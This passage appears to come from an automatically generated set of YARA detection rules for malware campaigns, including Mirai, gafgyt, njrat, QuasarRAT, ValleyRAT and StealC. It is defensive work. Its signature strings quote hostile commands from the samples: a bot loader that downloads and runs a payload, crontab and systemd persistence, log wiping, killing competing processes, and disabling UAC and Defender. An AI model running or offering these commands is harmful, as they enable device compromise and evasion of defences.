        $s8 = "?isObscuredBy@QGraphicsPolygonItem@@UEBA_NPEBVQGraphicsItem@@@Z" ascii
        $s9 = "?modifiers@QGraphicsSceneDragDropEvent@@QEBA?AV?$QFlags@W4KeyboardModifier@Qt@@@@XZ" ascii
        $s10 = "?match@QRegularExpression@@QEBA?AVQRegularExpressionMatch@@AEBVQString@@HW4MatchType@1@V?$QFlags@W4M" ascii
        $s11 = "?boundingRect@QGraphicsPolygonItem@@UEBA?AVQRectF@@XZ" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11161600 and 12 of them
}

rule Sightlines_imphash_e9e833e0_gh0strat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-e9e833e0"
        date = "2026-10-23"
        campaign = "imphash-e9e833e0"
        family = "gh0strat"
        hash = "4e50d7fcd52abdf13c2159b53b6a4fa7c6483c3eaebf3bf792db129e6fd80e73"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-e9e833e0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "function DownloadTemporaryFile(const Url, FileName, RequiredSHA256OfFile: String; const OnDownloadPr" ascii
        $s1 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s2 = "?TObjectDictionary<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>M" ascii
        $s3 = "`TEnumerable<System.Generics.Collections.TPair<Winapi.Windows.HWND,Vcl.Themes.TChildControlInfo>>'" ascii
        $s4 = "\\TEnumerable<System.Generics.Collections.TPair<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>>'" ascii
        $s5 = "LTDictionary<Winapi.Windows.HWND,Vcl.Themes.TChildControlInfo>.TKeyEnumerator;" ascii
        $s6 = "CTObjectDictionary<Winapi.Windows.HWND,Vcl.Themes.TChildControlInfo>M" ascii
        $s7 = "`TEnumerator<System.Generics.Collections.TPair<Winapi.Windows.HWND,Vcl.Themes.TChildControlInfo>>(" ascii
        $s8 = "ITDictionary<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>.TPairEnumerator;" ascii
        $s9 = "\\TEnumerator<System.Generics.Collections.TPair<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>>(" ascii
        $s10 = "JTDictionary<Winapi.Windows.HWND,Vcl.Themes.TSysStyleHook>.TValueEnumerator;" ascii
        $s11 = "Invalid time Offset string: %s$SHA2: Cannot update a finalized hash=Error decoding URL style (%%XX) " wide
    condition:
        uint16(0) == 0x5A4D and filesize < 40811752 and 12 of them
}

rule Sightlines_imphash_a731d9ff_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a731d9ff"
        date = "2026-10-23"
        campaign = "imphash-a731d9ff"
        family = ""
        hash = "01c1d69e51631a9dcd20beb62278497e0e2b164cd5955c7750299f67ab93826f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a731d9ff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s4 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s5 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s6 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s7 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s8 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s9 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
        $s10 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
        $s11 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 41387930 and 12 of them
}

rule Sightlines_tlsh_90182bb0_gafgyt
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-90182bb0"
        date = "2026-10-23"
        campaign = "tlsh-90182bb0"
        family = "gafgyt"
        hash = "646026303b48c55cc1cb48b406bddff35e952b615720217bacf6728a1d448822"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-90182bb0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\K]6D3]4$T]^$DGD$DA3JO=*B4P&;7;1/proc/self/exe" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s2 = "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" ascii
        $s3 = "upgrade-insecure-requests" ascii
        $s4 = "__vdso_clock_gettime64" ascii
        $s5 = "Connection: keep-alive" ascii
        $s6 = "sec-ch-ua-platform" ascii
        $s7 = "gzip, deflate, br" ascii
        $s8 = ".note.gnu.property" ascii
        $s9 = "/proc/self/status" ascii
        $s10 = "sec-ch-ua-mobile" ascii
        $s11 = "GET %s HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_fcd3df0e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fcd3df0e"
        date = "2026-10-23"
        campaign = "tlsh-fcd3df0e"
        family = ""
        hash = "3a713c5ce832c00a959f2603dd757e453c5b4b01b3d2f528ee4636db8c012777"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fcd3df0e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ULT1M4T3-STY-CNC-CH4CH4-K3Y!2026/proc/self/exe" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s2 = "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" ascii
        $s3 = ",:HVVVVVVdt-0X+0X 0X-0x+0x 0x" ascii
        $s4 = "upgrade-insecure-requests" ascii
        $s5 = "Connection: keep-alive" ascii
        $s6 = "__kernel_clock_gettime" ascii
        $s7 = "sec-ch-ua-platform" ascii
        $s8 = "expand 32-byte kg" ascii
        $s9 = "gzip, deflate, br" ascii
        $s10 = "/proc/self/status" ascii
        $s11 = "sec-ch-ua-mobile" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_9613bd7a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-9613bd7a"
        date = "2026-10-23"
        campaign = "imphash-9613bd7a"
        family = ""
        hash = "36c3922133d08c3b05eda761d3d0667000729ec541a2b8c3dba443904bf88da9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-9613bd7a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Mrgpcvkml\"amorngvgf\"qwaagqqdwnn{" ascii
        $s1 = "Dbttrddqb{{n7zxs~q~rs7erp~dcen9" ascii
        $s2 = "`abcdefghijklmno" ascii
        $s3 = "Faejl{jk/fa{`/" ascii
        $s4 = "9!*+UVYZNtuo" ascii
        $s5 = "pTrA)XTrq)\\Uc" ascii
        $s6 = "Xo{excQoo\\\\\\" ascii
        $s7 = "013478=*,T" ascii
        $s8 = "9$*+UYOtu`" ascii
        $s9 = "9|f_QLaC!F" ascii
        $s10 = "Z dXR1>,Q." ascii
        $s11 = "CEVYDVTC^XY" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10848256 and 12 of them
}

rule Sightlines_tlsh_dca7dcdc_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-dca7dcdc"
        date = "2026-10-23"
        campaign = "tlsh-dca7dcdc"
        family = ""
        hash = "5143aa3e277c58918935281938d99e668ed3bdddf80578b17a0ad16d4556bf15"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-dca7dcdc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Mrgpcvkml\"amorngvgf\"qwaagqqdwnn{" ascii
        $s1 = "Dbttrddqb{{n7zxs~q~rs7erp~dcen9" ascii
        $s2 = "Amo1Amo5Amo;Amo\"Amo+Amo/AmoSAmo[AmoLAmoyAmoaAmo" ascii
        $s3 = "@mo0@mo3@mo8@mo?@mo,@moY@moE@mov@mo`@mo" ascii
        $s4 = "soo3soo:soo#soo'soo+sooSsooDsooqsooysoolsoo" ascii
        $s5 = "0looPhoo8loo)looXlooGlooyloojloo" ascii
        $s6 = "roo0roo7roo$rooQroo]rooNrooxrookroo" ascii
        $s7 = "aoo6aoo aoo'aoo@aooDaooGaooNaoo~aoo" ascii
        $s8 = "eoo2eoo:eoo#eoo.eooYeooFeooreoo~eoo" ascii
        $s9 = "ioo8ioo ioo)iooTioo_iooLiooxioodioo" ascii
        $s10 = "moo;moo'mooRmooZmooCmooNmooymoofmoo" ascii
        $s11 = "`oo4`oo#`oo^`ooC`ooJ`ooy`oo``ook`oo" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3244032 and 12 of them
}

rule Sightlines_tlsh_edf4559a_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-edf4559a"
        date = "2026-10-23"
        campaign = "tlsh-edf4559a"
        family = "connectwise"
        hash = "1f01ff480f1e0efd0361c7647b1d8de8b8a0b086a4864fe7d65f1ab8f1997c31"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-edf4559a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "24?69<>BNPREDHKMY_aTVX[]dftsihlnprvw$&($&(|{" wide
        $s1 = "394821E67B}NOT EXCLUDE_BACKSTAGE_SHELLScreenConnect.WindowsBackstageShell.exeFileManagerFiles{80C42F" ascii
        $s2 = "E1-27A8-4EB1-896F-161D3237D864}NOT EXCLUDE_FILE_MANAGERScreenConnect.WindowsFileManager.exeServiceFi" ascii
        $s3 = "ationPackage.dllCredentialProviderFiles{595C1B10-5F3C-42F7-B006-5D9C44DEC4FF}NOT EXCLUDE_CREDENTIAL_" ascii
        $s4 = "TNetFramework40ClientCustomActionLibraryWixCAMainFiles{E0EF5F66-7B92-40DE-8B20-EB91E1C859BB}INSTALLL" ascii
        $s5 = "ge.dll]reg86A6324C5FADB6CB634CB54F9A254136CLSID\\[CREDENTIAL_PROVIDER_CLASS_ID][ProductName] Credenti" ascii
        $s6 = "OCATIONNOT EXCLUDE_MAINScreenConnect.ClientService.dllBackstageShellFiles{DDCF1E82-0B14-4C68-A063-33" ascii
        $s7 = "1BB32EEE98CBEDESoftware\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727InstallSOFTWARE\\Microsoft\\NET Fr" ascii
        $s8 = "\"[INSTALLLOCATION]ScreenConnect.WindowsClient.exe\" \"%1\"reg3831C0C36D9CE44BC3E6FAE6F161BEA8System\\Cur" ascii
        $s9 = "urrentVersion\\Authentication\\Credential Providers\\[CREDENTIAL_PROVIDER_CLASS_ID]reg685500C4A1A36BBDF" ascii
        $s10 = "3BF2B6E27BUseOriginalUrlEncoding#1regED314AE69CE5D835D523FB365C82C36B[URL_SCHEME]\\shell\\open\\command" ascii
        $s11 = "OMODIFYALLUSERS1ManufacturerScreenConnect SoftwareProductCode{B292C5EA-BF5F-4280-B056-1670FB10BB1D}P" ascii
    condition:
        filesize < 19922944 and 12 of them
}

rule Sightlines_host_722d77c3_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-722d77c3"
        date = "2026-10-22"
        campaign = "host-722d77c3"
        family = "mirai"
        hash = "073acd8059a1c492fcfe4bee8b5a6134003d85a4f30f5718a9a9c21d842d16e3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-722d77c3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Embedded Telnet Server.*WARNING:.*authorized users only" ascii
        $s1 = "(crontab -l 2>/dev/null; printf '@reboot %s %s &\\n') | crontab - 2>/dev/null" ascii
        $s2 = "killall -9 httpd lighttpd boa goahead mini_httpd webs 2>/dev/null" ascii
        $s3 = "killall -9 .t .nttpd .sh4 dvrHelper yakuza .mi mozi satori .tsunami .hakai .owari mirai hajime .nipp" ascii
        $s4 = "/bin/busybox chmod 777 .f || chmod 777 .f; ./.f telnet; rm -f .f" ascii
        $s5 = "on macHelper .z .loaded zollard .chinaz .sh 2>/dev/null" ascii
        $s6 = "/bin/busybox cat /proc/self/exe || cat /proc/self/exe" ascii
        $s7 = "TELNET session now in ESTABLISHED state" ascii
        $s8 = "/bin/busybox cat /proc/cpuinfo || cat /proc/cpuinfo" ascii
        $s9 = "Ubee Interactive Corporation Telnet Server" ascii
        $s10 = "NetComm ADSL2\\S Wireless Router" ascii
        $s11 = "Copyright (c) 2010-2012 Hewle" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1838288 and 8 of them
}

rule Sightlines_tlsh_91f431a3_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-91f431a3"
        date = "2026-10-21"
        campaign = "tlsh-91f431a3"
        family = "mirai"
        hash = "18b5057e1f21d9999af1799e1a18f1fb21a2d043d303f67563f4fd4bd8dcca42"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-91f431a3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "(atomic/exe) Killed process: %s, PID: %d" ascii
        $s2 = "(atomic/maps) Killed Process: %s, PID: %d" ascii
        $s3 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s4 = "/usr/libexec/openssh/sftp-server" ascii
        $s5 = "HOST: 255.255.255.255:1900" ascii
        $s6 = "/usr/lib/systemd/systemd" ascii
        $s7 = "MAN: \"ssdp:discover\"" ascii
        $s8 = "M-SEARCH * HTTP/1.1" ascii
        $s9 = "/usr/compress/bin/" ascii
        $s10 = "/root/dvr_gui/" ascii
        $s11 = "/root/dvr_app/" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_51426235_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-51426235"
        date = "2026-10-22"
        campaign = "tlsh-51426235"
        family = "mirai"
        hash = "0bb1e6a3be4fe5294ea2c5f1463f298a05e6deba4601c3fa64180859ee7d13c6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-51426235.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s1 = "systemctl daemon-reload 2>/dev/null; systemctl enable killer-helper.service 2>/dev/null" ascii
        $s2 = "journalctl --rotate --vacuum-time=1s 2>/dev/null" ascii
        $s3 = "cannot create TLS data structures: ABORT" ascii
        $s4 = "cannot allocate memory in static TLS block" ascii
        $s5 = "/etc/systemd/system/killer-helper.service" ascii
        $s6 = "Accept-Language: en-US,en;q=0.5" ascii
        $s7 = "Invalid multibyte format string." ascii
        $s8 = "Accept-Encoding: gzip, deflate" ascii
        $s9 = "0.0.0.0 www.hybrid-analysis.com" ascii
        $s10 = "PATH=/usr/sbin:/usr/bin:/sbin:/bin" ascii
        $s11 = "/usr/lib/systemd/.system-helper" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 3 of them
}

rule Sightlines_dotnet_typelib_guid_f888feeb_quasarrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-f888feeb"
        date = "2026-10-22"
        campaign = "dotnet_typelib_guid-f888feeb"
        family = "quasarrat"
        hash = "0fdf8b638918ac7a04c36e6ea150548dcd245caa8674601c8a9d5905e77f9bc3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-f888feeb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Are you mixing protobuf-net and protobuf-csharp-port? See https://stackoverflow.com/q/11564914/23354" wide
        $s1 = "      <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerM" ascii
        $s2 = "Org.BouncyCastle.X509.Allow_Non-DER_TBSCert" wide
        $s3 = "SELECT * FROM Win32_OperatingSystem WHERE Primary='true'" wide
        $s4 = "5ProtoBuf.Meta.MetaType+<GetAllGenericArguments>d__104" ascii
        $s5 = " length; see https://stackoverflow.com/q/2152978/23354" wide
        $s6 = "'signatureAndHashAlgorithm' cannot be null for (D)TLS 1.2+" wide
        $s7 = "invalid length for GOST3410_2012 public key" wide
        $s8 = "invalid length for GOST3410_2001 public key" wide
        $s9 = "SELECT * FROM Win32_DisplayConfiguration" wide
        $s10 = "<149ef234-534f-4248-9e1b-6af875c1ef7c><PrivateImplementationDetails>" ascii
        $s11 = "Unrecognized curve OID for GostR3410x2001 private key" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 10258432 and 3 of them
}

rule Sightlines_signer_cert_sha1_591b34e9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-591b34e9"
        date = "2026-10-22"
        campaign = "signer_cert_sha1-591b34e9"
        family = ""
        hash = "00436a440caaf87f038abf67f023658b8e17be98ded878fe0bc24a5d47bddbd8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-591b34e9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "https://d.symcb.com/rpa0" ascii
        $s1 = "201230235959Z0^1" ascii
        $s2 = "201229235959Z0b1" ascii
        $s3 = "Western Cape1" ascii
        $s4 = "Durbanville1" ascii
        $s5 = "121018000000Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 8594400 and 5 of them
}

rule Sightlines_signer_cert_sha1_2cf78abf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-2cf78abf"
        date = "2026-10-22"
        campaign = "signer_cert_sha1-2cf78abf"
        family = ""
        hash = "0f885b509a685d2bbfa652fed26b5fb31d88fbdab0a978c641d1c7b8aa460aa9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-2cf78abf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "260515184909Z0t1" ascii
        $s1 = "230217+5049170" ascii
        $s2 = "230889+5049200" ascii
        $s3 = "260515182606Z0" ascii
        $s4 = "250515184909Z" ascii
        $s5 = "250515182606Z" ascii
        $s6 = "G!2Wv[.O" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1115456 and 7 of them
}

rule Sightlines_signer_cert_sha1_142fb118_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-142fb118"
        date = "2026-10-22"
        campaign = "signer_cert_sha1-142fb118"
        family = ""
        hash = "184146852727a9db4eea06178716bec3cdbb1015c911f6b0f915b184ad7775b2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-142fb118.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "260515184910Z0t1" ascii
        $s1 = "230217+5049070" ascii
        $s2 = "230889+5049100" ascii
        $s3 = "260515182607Z0" ascii
        $s4 = "250515182607Z" ascii
        $s5 = "250515184910Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1107104 and 6 of them
}

rule Sightlines_tlsh_db186414_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-db186414"
        date = "2026-10-22"
        campaign = "tlsh-db186414"
        family = ""
        hash = "04579a2339198dc8ffc099f59eb6727a1b0889e2916131a3de80defada9d847c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-db186414.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "[ -s q ] || { command -v python3 >/dev/null 2>&1 && python3 -c \"import urllib.request as u,sys;u.url" ascii
        $s1 = "retrieve(sys.argv[1],sys.argv[2])\" \"$U\" q 2>/dev/null; }" ascii
        $s2 = "if command -v wget >/dev/null 2>&1; then wget -q -O q \"$U\" 2>/dev/null; fi" ascii
        $s3 = "# apex4 loader - arch-detect, multi-method download, run apex4 bot (C2 31)." ascii
        $s4 = "cd /tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd /var/tmp 2>/dev/null || cd /var/run 2>/dev/null" ascii
        $s5 = "  aarch64|arm64|armv8*) A=aarch64 ;;" ascii
        $s6 = "  i386|i486|i586|i686) A=x86 ;;" ascii
        $s7 = "  ppc*|powerpc*) A=powerpc ;;" ascii
        $s8 = "chmod 777 q 2>/dev/null" ascii
        $s9 = "  mipsel) A=mipsel ;;" ascii
    condition:
        filesize < 1048576 and 9 of them
}

rule Sightlines_host_93c2dc5c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-93c2dc5c"
        date = "2026-10-21"
        campaign = "host-93c2dc5c"
        family = "mirai"
        hash = "00b8c81a2b43524469dd3fa7a121e8c8701e7355ae5440bf108a54daac958fff"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-93c2dc5c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/var/tmp/%s\\nRestart=on-failure\\nRestartSec=30\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/syst" ascii
        $s1 = "printf '[Unit]\\nDescription=System Service\\nAfter=network.target\\n[Service]\\nType=simple\\nExecStart=" ascii
        $s2 = "echo '0' > /proc/sys/kernel/pid_max 2>/dev/null" ascii
        $s3 = "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null" ascii
        $s4 = "find /tmp /var/tmp /dev/shm /root -name '*%s*' -delete 2>/dev/null" ascii
        $s5 = "chmod +x /var/tmp/%s /usr/lib/%s 2>/dev/null" ascii
        $s6 = "systemctl daemon-reload 2>/dev/null; systemctl enable %s 2>/dev/null" ascii
        $s7 = "rm -f /lib/systemd/system/%s.service 2>/dev/null" ascii
        $s8 = "systemctl stop %s 2>/dev/null; systemctl disable %s 2>/dev/null" ascii
        $s9 = "sed -i '/%s/d' /etc/rc.local 2>/dev/null" ascii
        $s10 = "rm -f /etc/systemd/system/%s.service 2>/dev/null" ascii
        $s11 = "chattr +i /var/tmp/%s 2>/dev/null" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_4b1fd03c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-4b1fd03c"
        date = "2026-10-22"
        campaign = "dotnet_typelib_guid-4b1fd03c"
        family = ""
        hash = "5ae667a2ffce6864964f906c2ec7049b342a534ebb8e38a8d0640e6656e0de7a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-4b1fd03c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "A+ (Vrhunsko porinuce brodogradilista Klajd)" wide
        $s4 = "Uslovno prihvatljivo (B-) - Zaustavni put je bio preblizu suprotne obale reke Klajd. Potrebna je rev" wide
        $s5 = "5. Vodonepropusno ispitivanje tankova (88%):" wide
        $s6 = "Faza 3: Izbijeni drveni klinovi! Trup klizi krmom napred u reku Klajd." wide
        $s7 = "Reka Klajd (Visoka voda / Plima +3.75 m)" wide
        $s8 = "The value for column 'c' in table 'DataTable1' is DBNull." wide
        $s9 = "Izgradnja trupa kompletirana 100%! Spreman za podmazivanje i porinu" wide
        $s10 = "Moment uzgona nadvladava moment mase. Kobilica se rotira, prednje sanke primaju vr" wide
        $s11 = "4. Pneumatsko i rucno zakivanje (92%):" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2542592 and 12 of them
}

rule Sightlines_tlsh_dd52c19b_njrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-dd52c19b"
        date = "2026-10-22"
        campaign = "tlsh-dd52c19b"
        family = "njrat"
        hash = "165619e61ebf6feb78b2b78f1fa407540e71712e6fe8185bb810c8dffd54eaff"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-dd52c19b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "cmd /c reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DW" wide
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "cmd /c rundll32.exe user32.dll,LockWorkStation" wide
        $s5 = "cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring $true" wide
        $s6 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" ascii
        $s7 = "Cannot overwrite MBR, needs Admin privilege" wide
        $s8 = "As you reboot, you find that your MBR has been overwritten." ascii
        $s9 = "AdminCheck: Can't use MBR. (No admin)" wide
        $s10 = "BluetoothNotificationAreaIconWindowClass" wide
        $s11 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_bd42f490_valleyrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-bd42f490"
        date = "2026-10-22"
        campaign = "imphash-bd42f490"
        family = "valleyrat"
        hash = "116a7bbe25ff2bb79a7775abcad3082acf7ba67ecee9d418c639bd74cc9a6d04"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-bd42f490.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_PYI_APPLICATION_HOME_DIR environment variable is not defined!" ascii
        $s1 = "Failed to set _PYI_PARENT_PROCESS_LEVEL environment variable!" ascii
        $s2 = " inflate 1.3.2 Copyright 1995-2026 Mark Adler " ascii
        $s3 = "Security descriptor string length exceeds PYI_PATH_MAX!" wide
        $s4 = "Could not allocate memory for SPLASH_CONTEXT." ascii
        $s5 = "SPLASH: length of Tk shared library path exceeds maximum path length!" ascii
        $s6 = "Invalid value in _PYI_PARENT_PROCESS_LEVEL: %s" ascii
        $s7 = "SPLASH: length of Tk module directory path exceeds maximum path length!" ascii
        $s8 = "Could not allocate memory for DYLIB_PYTHON structure." ascii
        $s9 = "SPLASH: length of Tcl shared library path exceeds maximum path length!" ascii
        $s10 = "SPLASH: length of Tcl module directory path exceeds maximum path length!" ascii
        $s11 = "Could not side-load PyInstaller's PKG archive from external file (%s)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 40678486 and 12 of them
}

rule Sightlines_imphash_1c2c9a7a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-1c2c9a7a"
        date = "2026-10-22"
        campaign = "imphash-1c2c9a7a"
        family = ""
        hash = "3a62ba9d46cb84d3e77a2a45285c6b354bdd7a7944ca30ad6d486939b5a0a729"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-1c2c9a7a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" wide
        $s1 = "Elevation:Administrator!new:" wide
        $s2 = "%s_%s_tempchunk_%d" ascii
        $s3 = "D$XHcD$DH;D$Xs" ascii
        $s4 = "D$(HcD$HHcL$(H" ascii
        $s5 = "D$@H;D$Xt8H" ascii
        $s6 = "D$PH;D$Xs^H" ascii
        $s7 = "D$HH;D$htqH" ascii
        $s8 = "D$d;D$hr7H" ascii
        $s9 = "D$p;D$tt#H" ascii
        $s10 = "$H;D$0sPH" ascii
        $s11 = "T$0HcD$(H" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1527808 and 12 of them
}

rule Sightlines_imphash_67d2dbca_stealc
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-67d2dbca"
        date = "2026-10-22"
        campaign = "imphash-67d2dbca"
        family = "stealc"
        hash = "09d980d295bc92df536ea2e2d6b37fb8eda7b1ea87a05bd97415c8d6dbe40bd2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-67d2dbca.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s1 = "    <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
